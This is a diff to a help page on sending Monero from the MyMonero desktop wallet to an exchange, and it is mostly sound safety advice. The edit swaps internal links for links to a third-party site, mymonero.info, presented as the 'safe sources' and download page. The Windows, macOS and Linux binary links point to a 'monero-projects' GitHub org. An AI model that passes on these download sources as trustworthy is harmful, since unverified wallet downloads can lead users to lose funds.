@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 You can send XMR from the MyMonero desktop wallet to an exchange by creating a normal transaction to the deposit address shown by that exchange. Confirm the address, network, and amount carefully; a transfer to the wrong destination may not be recoverable.
 
+
+Prefer reading on the web? The [MyMonero send withdraw page](https://mymonero.info/mymonero-send-withdraw) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.
+
 ## You'll see this if
 - You want to move XMR from your MyMonero wallet to an exchange account.
 - The exchange asks you to provide a deposit address or payment ID instructions.
@@ -37,8 +40,8 @@ MyMonero desktop's final release is v1.3.3, available for Windows as an .exe, ma
 ## Fix
 1. **Check the exchange deposit instructions.** Sign in to the exchange using your usual route, open its XMR deposit page, and make sure the asset is Monero (XMR). Read any destination tag, minimum deposit, or confirmation requirements shown there. If the exchange does not currently accept XMR deposits, do not send.
 2. **Create or confirm the destination.** Use the address displayed by the exchange for your own account. Copy it using the exchange interface, then compare the beginning and ending characters after pasting into MyMonero. Be alert for clipboard substitution: if the pasted address differs from the one you copied, stop and investigate. Never use an address from a message or an unsolicited support contact.
-3. **Open your wallet locally.** Launch MyMonero desktop and select the wallet that contains the XMR. Check that it is the wallet you intend to use. If your wallet is not appearing or your credentials are unclear, consult [restore a MyMonero wallet](./restore-mymonero-wallet.md) before sending anything.
-4. **Check spendable funds.** Review the spendable amount, not only the total balance. Leave enough available to cover the transaction fee shown by the wallet. Do not try to work around a locked balance; wait for the wallet and network to make funds available, or diagnose a scan issue using [MyMonero balance shows zero](./mymonero-balance-shows-zero.md).
+3. **Open your wallet locally.** Launch MyMonero desktop and select the wallet that contains the XMR. Check that it is the wallet you intend to use. If your wallet is not appearing or your credentials are unclear, consult restore a MyMonero wallet before sending anything.
+4. **Check spendable funds.** Review the spendable amount, not only the total balance. Leave enough available to cover the transaction fee shown by the wallet. Do not try to work around a locked balance; wait for the wallet and network to make funds available, or diagnose a scan issue using MyMonero balance shows zero.
 5. **Enter the transfer details.** Paste the exchange address into the recipient field and enter the amount requested. Follow the exchange's current deposit directions for any additional information. Do not invent or reuse a payment detail from an old transaction. If the wallet offers a final review, use it to inspect the recipient, amount, and fee.
 6. **Verify before sending.** Compare the address in the wallet with the exchange's deposit address, character by character where practical. Confirm the amount and that you are sending XMR. A small test transfer can help you confirm the exchange process, but it may be subject to minimum deposit requirements and additional fees; check first.
 7. **Send once and retain the transaction details.** Submit the transaction only after reviewing it. Keep the transaction identifier privately for your own records. Do not post it alongside personal information or share your seed, private keys, or wallet password with anyone offering to help.
@@ -49,7 +52,7 @@ MyMonero desktop's final release is v1.3.3, available for Windows as an .exe, ma
 
 ---
 ## If that did not work
-If the transaction is absent from wallet history, first confirm that you completed the send flow and that the wallet has scanned recent activity. Use [MyMonero not syncing guidance](./mymonero-not-syncing.md) if the view appears stale. If the transaction is visible but not credited, compare its status with the exchange's deposit instructions and contact the exchange through its official account support route. Do not send a second payment just because the first has not appeared.
+If the transaction is absent from wallet history, first confirm that you completed the send flow and that the wallet has scanned recent activity. Use MyMonero not syncing guidance if the view appears stale. If the transaction is visible but not credited, compare its status with the exchange's deposit instructions and contact the exchange through its official account support route. Do not send a second payment just because the first has not appeared.
 
 If the wallet reports insufficient spendable funds, check for pending incoming funds and leave room for the displayed fee. A total balance is not necessarily the amount available to send. If the exchange address was entered incorrectly, contact the exchange through its official support channel; do not assume the transaction can be reversed. For safer handling of a full move, read sweeping funds to a new wallet.
 
@@ -92,6 +95,7 @@ Check the transaction status in MyMonero and the exchange's stated confirmation 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
